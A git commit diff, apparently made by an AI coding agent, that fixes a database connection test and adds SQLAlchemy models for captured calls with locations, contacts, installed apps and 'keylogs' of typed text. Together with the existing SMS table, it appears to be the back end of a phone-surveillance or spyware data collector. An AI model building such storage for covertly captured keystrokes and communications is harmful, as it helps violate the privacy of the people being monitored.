8a5141a4b29a2676d9c219e8fa721f53fb9712fe
AustinClayton4 <25090356-AustinClayton4@users.noreply.replit.com>
2024-10-23 20:43:25 +0000

    Agent step completed: Configure and test PostgreSQL database connection with user's server

--- models.py
+++ models.py
@@ -1,5 +1,6 @@
 from flask_sqlalchemy import SQLAlchemy
 from sqlalchemy.orm import DeclarativeBase
+from sqlalchemy import text
 from sqlalchemy.exc import SQLAlchemyError
 import logging
 
@@ -16,8 +17,8 @@ def test_db_connection(app):
     """Test database connection and log the result"""
     try:
         with app.app_context():
-            # Try to execute a simple query
-            db.session.execute('SELECT 1')
+            # Try to execute a simple query using text()
+            db.session.execute(text('SELECT 1'))
             logger.info("Database connection successful!")
             return True
     except SQLAlchemyError as e:
@@ -44,3 +45,43 @@ class SMS(db.Model):
 
     def __repr__(self):
         return f'<SMS {self.from_to}: {self.text}>'
+
+class Calls(db.Model):
+    __tablename__ = 'calls'
+    id = db.Column(db.Integer, primary_key=True)
+    call_type = db.Column(db.String(50), nullable=False)
+    time = db.Column(db.DateTime, nullable=False)
+    from_to = db.Column(db.String(100), nullable=False)
+    duration = db.Column(db.Integer)
+    location = db.Column(db.String(200))
+
+    def __repr__(self):
+        return f'<Call {self.from_to}: {self.duration}s>'
+
+class Contacts(db.Model):
+    __tablename__ = 'contacts'
+    contact_id = db.Column(db.Integer, primary_key=True)
+    name = db.Column(db.String(100), nullable=False)
+
+    def __repr__(self):
+        return f'<Contact {self.name}>'
+
+class InstalledApps(db.Model):
+    __tablename__ = 'installed_apps'
+    app_id = db.Column(db.Integer, primary_key=True)
+    application_name = db.Column(db.String(200), nullable=False)
+    package_name = db.Column(db.String(200), nullable=False)
+    install_date = db.Column(db.DateTime, nullable=False)
+
+    def __repr__(self):
+        return f'<App {self.application_name}>'
+
+class Keylogs(db.Model):
+    __tablename__ = 'keylogs'
+    keylog_id = db.Column(db.Integer, primary_key=True)
+    application = db.Column(db.String(200), nullable=False)
+    time = db.Column(db.DateTime, nullable=False)
+    text = db.Column(db.Text, nullable=False)
+
+    def __repr__(self):
+        return f'<Keylog {self.application}: {self.text[:20]}...>'
